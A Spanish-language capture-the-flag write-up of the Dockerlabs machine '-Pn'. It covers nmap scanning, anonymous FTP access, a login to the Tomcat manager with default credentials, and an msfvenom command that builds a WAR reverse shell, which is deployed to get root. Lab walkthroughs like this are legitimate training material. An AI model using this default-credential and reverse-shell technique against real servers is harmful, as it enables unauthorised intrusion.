# Writeup de la Máquina -Pn de Dockerlabs

Lo primero que hago es realizar un escaneo de todos los puertos que tenga abiertos la máquina con la herramienta nmap.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
```
![Primer nmap](_images/Screenshot_1.png)

Una vez realizado el escaneo recojo los puertos abiertos con la utilidad extractPorts, del fichero donde se ha guardado el escaneo de nmap. 

```bash
extractPorts allPorts
```
![ExtractPorts](_images/Screenshot_2.png)

Teniendo los puertos copiados procedo a ejecutar un escaneo más profundo solo para los puertos 21 y 8080 con nmap.

```bash
sudo nmap -p21,8080 -sCV 172.17.0.2 -oN targeted
```

![Segundo Nmap](_images/Screenshot_3.png)

Al terminar el escaneo veo que tiene habilitado el usuario anonymous para hacer login en el servicio FTP. Así que procedo a connectarme y listar el conteidos

```bash
ftp 172.17.0.2
```
![FTP Connection](_images/Screenshot_4.png)

Una vez dentro observo que hay un archivo llamado tomcat.txt, este me lo bajo y miro su contenido.

![Tomcat](_images/Screenshot_5.png)

Este indica que se tiene que configurar el servidor tomcat que tiene pinta que se esta corriendo en puerto 8080. Para ver esto compruebo las tecnologias con whatweb.

```bash
whatweb http://172.17.0.2:8080
```
![whatweb](_images/Screenshot_6.png)

Efectivamente saca que es un servidor tomcat, sabiendo esto decido entrar a la interfaz web. En esta intento entrar al Tomcat Web Application Manager, para hacer esto entro a la url 172.17.0.2:8080/manager/html. Cuando intentas acceder te pide que inicies sesión con unas credenciales, así que procedo a buscar las credenciales por defecto de tomcat y con el usuario tomcat y la contraseña s3cr3t me permite entrar.

![Navegador](_images/Screenshot_7.png)
![Navegador 2](_images/Screenshot_8.png)
![Navegador 3](_images/Screenshot_9.png)
![Navegador 4](_images/Screenshot_10.png)
![Navegador 5](_images/Screenshot_11.png)

Una vez estando dentro creo con msfvenom una reverse shell en un archivo .war malicioso.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.76 -f war -o revshell.war
```
![Msfvenom](_images/Screenshot_20.png)

Una vez creado voy al apartado de desplegar un archivo war y selecciono la reverse shell que he creado anteriormente. Una vez desplegada me pongo en escucha en el puerto 443 con netcat y accedo a la url.

![Select](_images/Screenshot_21.png)
![Netcat](_images/Screenshot_23.png)
![Revshell](_images/Screenshot_22.png)

Una vez accedido a la url llega la shell a puerto 443 ya como el usuario root.

![root1](_images/Screenshot_24.png)
![root2](_images/Screenshot_25.png)
